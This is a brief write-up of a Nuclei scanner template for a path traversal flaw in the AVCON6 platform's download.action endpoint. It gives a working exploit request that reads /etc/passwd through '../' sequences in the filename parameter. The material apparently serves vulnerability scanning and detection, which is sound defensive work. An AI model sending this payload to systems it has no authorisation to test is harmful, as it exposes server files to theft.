# Nuclei Template: AVCON6 - Arbitrary File Download
**Template ID:** avcon6-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`avcon6-lfi.yaml`)

## Vulnerability Information & PoC

## Description
File Download vulnerability in the download.action of the AVCON6 system management platform, through which an attacker can download arbitrary files from the server

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/download.action?filename=../../../../../../etc/passwd
```

## References
- https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/AVCON6%20%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20download.action%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md
